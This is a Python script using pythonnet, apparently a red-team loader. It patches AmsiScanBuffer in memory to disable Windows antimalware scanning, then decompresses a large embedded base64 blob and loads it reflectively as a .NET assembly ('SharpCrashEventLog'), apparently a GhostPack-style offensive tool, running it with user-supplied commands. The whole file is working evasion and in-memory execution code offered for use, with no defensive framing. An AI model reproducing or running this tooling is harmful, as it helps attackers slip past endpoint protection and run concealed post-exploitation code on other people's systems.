import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCrashEventLog.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str](command)
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()